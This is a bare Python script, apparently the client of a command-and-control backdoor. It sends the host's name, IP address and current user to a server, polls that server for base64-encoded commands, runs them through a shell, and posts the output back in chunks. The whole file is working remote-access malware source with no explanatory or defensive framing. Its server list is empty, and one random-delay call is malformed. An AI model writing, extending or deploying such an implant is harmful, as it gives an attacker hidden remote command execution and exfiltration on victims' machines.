srv = ['']

import sys,time,base64,socket,random,getpass,subprocess
if sys.version_info.major==2:
  import urllib as parse
  import urllib2 as req
  def _x(*a,**k):
    o,e=subprocess.Popen(*a,**k).communicate()
    return e.decode(X)+o.decode(X)+' '
else:
  import urllib.parse as parse
  import urllib.request as req
  def _x(*a,**k):
    p=subprocess.run(*a,**k)
    return p.stderr.decode(X)+p.stdout.decode(X)+' '
D=10
N=50000
X='utf-8'
def _g(s,d):
  return req.urlopen(s+'?'+parse.urlencode(d)).read().decode(X)
def _p(s,d):
  return req.urlopen(req.Request(s,parse.urlencode(d).encode(X))).read().decode(X)
def _64d(s):
  return base64.b64decode(s.encode(X)).decode(X)
def _64e(s):
  return base64.b64encode(s.encode(X)).decode(X)
s_i=0
u=_g(srv[s_i],{'i':_64e('|'.join([socket.gethostname(),socket.gethostbyname(socket.gethostname()),getpass.getuser()]))})
print('python = {0}'.format(str(sys.version_info.major)))
print('uuid = {0}'.format(u))
while 1:
  b=[]
  s_i=(s_i+1)%len(srv)
  print('server = {0}'.format(srv[s_i]))
  while 1:
    d=_g(srv[s_i],{'u':u})
    if d:
      break
    time.sleep(random.randint(D))
  while 1:
    b.append(d)
    print('master data = {0}'.format(d))
    d=_g(srv[s_i],{'u':u})
    if not d:
      break
  x=''.join(b).split('|')
  r=''
  if x[0]=='0':
    try:
      print('running command: {0}'.format(_64d(x[1])))
      r=_64e(_x(_64d(x[1]),stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=1))
    except Exception as e:
      r=_64e(str(e))
  elif x[0]=='1':
    pass
  elif x[0]=='2':
    pass
  for c in [r[i:i+N] for i in range(0,len(r),N)]:
    print('sending chunk: {0}'.format(c))
    _p(srv[s_i],{'u':u,'d':c})
  _p(srv[s_i],{'u':u,'d':''})


